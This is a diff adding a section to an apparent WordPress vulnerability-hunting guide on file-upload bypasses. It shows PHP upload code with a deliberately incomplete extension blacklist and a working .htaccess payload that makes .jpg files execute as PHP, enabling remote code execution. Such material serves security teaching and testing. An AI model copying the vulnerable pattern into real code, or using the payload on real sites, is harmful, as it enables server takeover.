@@ -2939,6 +2939,41 @@ curl -F 'file=@pwn.php' 'http://localhost/wp-admin/admin-ajax.php?action=upload_
 
 -------------
 
+- It is common for blacklist-based extension checks to forget to include .htaccess files. Unfortunately, uploading a .htaccess file can lead to Remote Code Execution (RCE) because this file is used to configure how the web server (usually Apache) processes requests.
+- For example, an attacker could use the .htaccess file to modify URL rewriting rules, allowing them to execute arbitrary PHP code embedded in user-controlled inputs or uploaded files. Additionally, directives like `AddHandler` or `SetHandler` can be used to force non-PHP files (like text files or images) to be interpreted as PHP, enabling the attacker to run server-side scripts that they previously uploaded.
+- Vulnerable code-:
+
+```php
+function upload_image(){
+    $file = $_FILES["file"];
+    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
+
+    // File extension blacklist (dangerous files to disallow)
+    $blacklist = array("php", "exe", "sh", "js", "bat", "pl", "py");
+
+    // Get the file extension
+    $file_ext = pathinfo($file["name"], PATHINFO_EXTENSION);
+
+    // Check if the file extension is blacklisted
+    if(in_array($file_ext, $blacklist)){
+        echo "File type not allowed!";
+        die();
+    }
+
+    // Process upload
+}
+```
+
+- To exploit it,we need to upload a malicious `.htaccess` that parse jpg files as php and trigger an RCE.
+
+```htaccess
+<FilesMatch "\.jpg$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+- Then, upload a malicious jpg with php code saved in it.
+
 
 
 
